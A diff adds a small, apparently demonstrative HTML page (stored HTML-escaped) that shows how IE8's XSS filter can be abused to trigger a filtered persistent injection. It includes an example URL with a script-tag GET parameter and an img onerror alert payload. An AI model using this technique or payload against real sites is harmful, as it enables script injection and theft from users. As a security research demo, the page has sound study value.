@@ -1,0 +1,12 @@
+The script on this page will alert a string.  Assume
+that string is a persistent injection (where quote
+&lt;br&gt;
+characters are filtered so that normal XSS is not
+possible).  IE8&#039;s filters can be abused to enable XSS
+&lt;br&gt;
+by providing a &quot;gratuitous GET parameter&quot;.  For example,
+try &lt;b&gt;
+http://0x.lv/simple.html?foo=&amp;lt;script&amp;gt;&lt;/b&gt;
+&lt;p&gt;
+
+&lt;script&gt;alert(&#039;&lt;img src=x:x onerror=alert(0)//&gt;&#039;)&lt;/script&gt;
